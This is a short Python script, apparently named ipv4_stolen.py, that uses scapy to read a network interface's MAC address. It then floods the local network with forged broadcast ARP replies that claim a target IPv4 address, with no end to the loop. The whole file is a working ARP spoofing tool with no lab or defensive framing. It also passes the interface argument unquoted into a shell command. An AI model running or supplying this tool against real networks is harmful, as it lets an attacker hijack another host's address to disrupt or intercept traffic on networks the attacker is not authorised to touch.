#! /usr/bin/python

from scapy.all import *
import os 
import sys
import time
import commands
import getopt 




def main(argv):

    uplink = ""
    target = ""
    
    try:
        opts, args = getopt.getopt(argv, "hu:t:", ["help", "uplink=", "target="])
    except getopt.GetoptError:
        print('Error: ./ipv4_stolen.py -u <uplink dev> -t <target ipv4 address>')
        print('   or: ./ipv4_stolen.py --uplink=<uplinl dev> --target=<target ipv4 address>')
        sys.exit(2)


    for opt, arg in opts:
        if opt in ("-h", "--help"):
            print(' ./ipv4_stolen.py -u <uplink dev> -t <target ipv4 address>')
            print('or: ./ipv4_stolen.py --uplink=<uplinl dev> --target=<target ipv4 address>')
            sys.exit()
        elif opt in ("-u", "--uplink"):
            uplink = arg
        elif opt in ("-t", "--target"):
            target = arg
    print('uplink dev: ', uplink)
    print('target: ', target)


    test1 = "grep 'link/ether' | awk '{print $2}'"
    mac_addr = commands.getoutput('ip add show dev %s | %s' % (uplink,test1))
    print mac_addr
    
    
    a=ARP(hwsrc=mac_addr, psrc=target, op=2)
     
    
    while 1 : 
        sendp(Ether(dst="ff:ff:ff:ff:ff:ff")/a, inter=0.1, count=5)
        time.sleep(3)


if __name__ == "__main__":
    main(sys.argv[1:])



